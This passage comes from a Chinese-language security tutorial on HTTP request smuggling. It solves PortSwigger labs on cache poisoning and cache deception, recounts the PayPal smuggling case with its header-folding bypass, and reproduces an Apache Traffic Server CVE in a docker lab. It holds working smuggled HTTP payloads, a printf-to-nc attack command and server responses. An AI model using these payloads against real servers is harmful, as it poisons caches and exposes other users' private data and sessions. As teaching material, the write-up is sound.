然后如果服务器根据 Host 进行跳转的话，我们会得到以下的 Response:
    HTTP/1.1 301 Moved Permanently
    Location: https://attacker-website.com/home/
这样，受害者，也就是访问`/scripts/include.js`这个的用户，会被跳转到我们控制的 url 了。
### Perform Web Cache Poisoning
这个场景也是基于上面的 Host 跳转的攻击场景，如果 Front 服务器还存在缓存静态资源的话，我们可以配合 HTTP Smuggling
进行缓存投毒，[Lab: Exploiting HTTP request smuggling to perform web cache
poisoning](https://portswigger.net/web-security/request-smuggling/exploiting/lab-perform-web-cache-poisoning)
> This lab involves a front-end and back-end server, and the front-end server
> doesn't support chunked encoding. The front-end server is configured to
> cache certain responses.
>
> To solve the lab, perform a [request smuggling](https://portswigger.net/web-> security/request-smuggling) attack that causes the cache to be poisoned,
> such that a subsequent request for a JavaScript file receives a redirection
> to the exploit server.
这个环境也是一个可以修改 Host 进行跳转的场景，而在`/post/next?postId=2`路由正好有一个跳转的 api
供我们使用，这个路由跳转到的是`/post?postId=4`。
根据题目描述，我们需要实现缓存投毒， 例如这里我们就选择`/resources/js/tracking.js`进行投毒，LAB
还给了我们制造投毒的服务，于是我们可以进行以下设置：
发送以下数据包一次：
    POST / HTTP/1.1
    Host: ac7a1f141fadd93d801c469f005500bf.web-security-academy.net
    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:70.0) Gecko/20100101 Firefox/70.0
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
    Accept-Encoding: gzip, deflate
    Connection: close
    Cookie: session=f6c7ZBB52a6iedorGSywc8jM6USu4685
    Upgrade-Insecure-Requests: 1
    Cache-Control: max-age=0
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 178
    Transfer-Encoding: chunked
    0
    GET /post/next?postId=3 HTTP/1.1
    Host: ac701fe61fabd97b8027465701f800a8.web-security-academy.net
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 10
    x=1
然后访问`/resources/js/tracking.js`:
我们可以看到响应包的跳转地址被我们修改成了我们 exploit 的服务器地址，然后我们访问正常服务器主页试试：
可以看到成功`alert(1)`。
整个流程我们可以利用以下流程来理解：
    Innocent        Attacker          Front           Backend
        |               |               |               |
        |               |--A(1A+1/2B)-->|               | 
        |               |               |--A(1A+1/2B)-->| 
        |               |               ||            [1/2B]
        |               |               |--C----------->| * ending B *
        |               |            [*CP*]|               |
        | ​ What is the difference between web cache poisoning and web cache
> deception?
>
>   * In **web cache poisoning** , the attacker causes the application to
> store some malicious content in the cache, and this content is served from
> the cache to other application users.
>   * In **web cache deception** , the attacker causes the application to
> store some sensitive content belonging to another user in the cache, and the
> attacker then retrieves this content from the cache.
>
在 Web 缓存投毒中，攻击者使应用程序将某些恶意内容存储在缓存中，并将该内容从缓存中提供给其他应用程序用户。  
在Web缓存欺骗中，攻击者使应用程序将一些属于另一个用户的敏感内容存储在缓存中，然后攻击者从缓存中检索该内容。
这个我们就不配合 [Lab: Exploiting HTTP request smuggling to perform web cache
deception](https://portswigger.net/web-security/request-smuggling/exploiting/lab-perform-web-cache-deception) 来做了，因为 LAB 提供的环境 victim
有点问题。
我们可以这么理解，我们发送如下 HTTP 请求：
    POST / HTTP/1.1
    Host: vulnerable-website.com
    Content-Length: 43
    Transfer-Encoding: chunked
    0
    GET /private/messages HTTP/1.1
    Foo: X
该 Smugle 的请求会用`Foo: X`吃掉下一个发过来的请求头的第一行，也就是`GET /xxx HTTP/1.1`那一行，并且这个请求还会带着用户的
Cookie 去访问，类似于一个CSRF，该请求变成了以下请求头：
    GET /private/messages HTTP/1.1
    Foo: XGET /static/some-image.png HTTP/1.1
    Host: vulnerable-website.com
    Cookie: sessionId=q1jn30m6mqa7nbwsa0bhmbr7ln2vmh7z
只要我们多发送几次，一旦用户访问的是静态资源，就可能会被 Front
服务器缓存起来，我们就可以拿到用户`/private/messages`的信息了。这里可能需要大量的重复发包，因为需要构造让静态资源缓存，还是需要一定运气的。
至此，HTTP Smuggling 的基本攻击面都已经介绍完毕了。
# Real World
## Paypal
首先肯定得来聊聊今年分享 HTTP Smuggling 的作者在 Black Hat 上分享的 Paypal 漏洞实例了
作者首先通过 HTTP Smuggling 的方式将一个用于 Paypal 登录的 js 文件进行了投毒：
    POST /webstatic/r/fb/fb-all-prod.pp2.min.js HTTP/1.1 
    Host: c.paypal.com
    Content-Length: 61 
    Transfer-Encoding: chunked
    0
    GET /webstatic HTTP/1.1
    Host: skeletonscribe.net?
    X: XGET /webstatic/r/fb/fb-all-prod.pp2.min.js HTTP/1.1 
    Host: c.paypal.com
    Connection: close
    HTTP/1.1 302 Found
    Location: http://skeletonscribe.net?, c.paypal.com/webstatic/
但是 Paypal 登录页面有 CSP 规则 `script-src` 限制了这个跳转。
后来作者发现该页面还有一个动态生成的 iframe 引入了 c.paypal.com ，且该子页面没有 CSP 而且还引入了作者投毒的 js
文件！虽然这样可以控制 iframe 页面，但是由于同源策略，是读不到父页面的数据的。
再接着作者的同事在 paypal.com/us/gifts 发现了一个不使用 CSP 的页面，并且也导入了作者投毒的 js 文件，这样作者终于通过 js 将
c.paypal.com 的 iframe 重定向到了 paypal.com/us/gifts ，这样就同源了，也就可以读取父页面的数据了。
Paypal 第一次修复是将 Akamai 配置修改成拒绝含有 Transfer-Encoding: chunked
的请求，但是后来又被作者构造了一个换行的 header 绕过了：
    Transfer-Encoding:
     chunked
## ATS
> ​ Apache Traffic Server（ATS）是美国阿帕奇（Apache）软件基金会的一款高效、可扩展的HTTP代理和缓存服务器。
>
> Apache ATS
> 6.0.0版本至6.2.2版本和7.0.0版本至7.1.3版本中存在安全漏洞。攻击者可利用该漏洞实施HTTP请求走私攻击或造成缓存中毒。
>
> 在美国国家信息安全漏洞库中，我们可以找到关于该漏洞的四个补丁，接下来我们详细看一下。
>
> CVE-2018-8004 补丁列表
>
>   * 
>   * 
>   * 
>   * 
>
>
> 注：虽然漏洞通告中描述该漏洞影响范围到7.1.3版本，但从github上补丁归档的版本中看，在7.1.3版本中已经修复了大部分的漏洞。
关于这四个补丁的分析与复现我觉得 @mengchen 师傅已经写的非常详细了，我就不在赘述了，建议看原文部分
[HTTP走私攻击实例——CVE-2018-8004](https://paper.seebug.org/1048/#4-httpcve-2018-8004)
这里我们说一下原文没有的部分：
    [dummy-host7.example.com]
                                            |
                                      +-[8080]-----+
                                      | 8007->8080 |
                                      |  ATS7      |
                                      |            |
                                      +-----+------+
                                            |
                                            |
                                      +--[80]----+
                                      | 8002->80 |
                                      |  Nginx   |
                                      |          |
                                      +----------+
我们构建以上场景，可以使用我搭建的 docker 实验环境 [lab1](https://github.com/ZeddYu/HTTP-Smuggling-Lab/tree/master/lab1)
### Request Splitting using Huge Header
我们可以通过使用 65535 个字符的 header 来进行实验，比如说我们可以通过使用以下代码来发送一个含有 65535 个字符的 header 的请求到
ATS 7:
    printf 'GET_/something.html?zorg2=5_HTTP/1.1\r\n'\
    'Host:_dummy-host7.example.com\r\n'\
    'X:_"%65534s"\r\n'\
    'GET_http://dummy-host7.example.com/index.html?replaced=0&cache=8_HTTP/1.1\r\n'\
    '\r\n'\
    |tr " " "1"\
    |tr "_" " "\
    |nc -q 1 127.0.0.1 8007
nginx 的返回会直接返回 400 错误，但是有 ATS 7 就比较有趣了，我们会得到一个 400 响应以及 ATS 7 的 200 响应
    HTTP/1.1 400 Invalid HTTP Request
    Date: Fri, 29 Nov 2019 18:52:42 GMT
    Connection: keep-alive
    Server: ATS/7.1.1
    Cache-Control: no-store
    Content-Type: text/html
    Content-Language: en
    Content-Length: 220
    Bad Request
    Bad Request
    Description: Could not process this request.
    HTTP/1.1 200 OK
    Server: ATS/7.1.1
    Date: Fri, 29 Nov 2019 18:52:42 GMT
    Content-Type: text/html
    Content-Length: 119
    Last-Modified: Fri, 29 Nov 2019 05:37:09 GMT
    ETag: "5de0ae85-77"
    X-Location-echo: /index.html?replaced=0&cache=8
    X-Default-VH: 0
    Cache-Control: public, max-age=300
    Accept-Ranges: bytes
    Age: 0
    Connection: keep-alive
    Nginx default static page
    Hello World
    It works!